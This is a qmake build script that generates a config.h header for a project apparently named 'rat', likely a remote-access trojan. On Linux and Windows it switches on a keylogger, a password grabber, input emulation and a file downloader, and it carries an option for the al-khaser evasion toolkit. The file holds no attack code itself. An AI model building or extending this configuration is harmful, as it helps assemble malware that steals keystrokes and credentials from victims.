content="// Config file for rat" \
    "// This file automaically generated, do not modify it by hand" \
    "$${LITERAL_HASH}ifndef RAT_CONFIG_H" \
    "$${LITERAL_HASH}define RAT_CONFIG_H" \
    " "

defineTest(set) {
#    message(value=$$1)
    content += "$${LITERAL_HASH}define $$1 $$2"
    export(content)
    $$1=$$2
    export($$1)
#    DEFINES+=$$1
#    export(DEFINES)
}
defineTest(set_str) {
    set($$1, \"$$2\")
}

#variables
set_str(RAT_SERVER_VERSION, 0.2.2)
set_str(RAT_CLIENT_VERSION, 0.5.1)
set_str(RAT_PLATFORM, $$PLATFORM_OS)
set_str(RAT_PLATFORM_NAME, $$PLATFORM_OS_W)
set_str(RAT_ARCH, $$PLATFORM_ARCH)
set(RAT_OS_$$PLATFORM_OS_U, " ")
set(RAT_USE_DAEMON, 0)

if (equals(PLATFORM_OS, "linux") || equals(PLATFORM_OS, "windows")) {
    set(RAT_KEY_LOGGER, 1)
    set(RAT_INPUT_EMU, 1)
    set(RAT_PASSWORD_GRABBER, 1)
    set(RAT_USE_LZ4, 1)
    set(RAT_USE_SCREEN_LITE, 0)
    set(RAT_USE_VLC, 0)
    set(RAT_USE_AL_KHASER, 0)
    set(RAT_FILE_DOWNLOADER, 1)
    set(RAT_SERVER_LOGGER, 1)
}

#set(RAT_IS_FAKE, 1)

content += " " "$${LITERAL_HASH}endif // RAT_CONFIG_H"
write_file($$PWD/config.h, content)
HEADERS += $$PWD/config.h
export(HEADERS)
message($$PWD/config.h created)
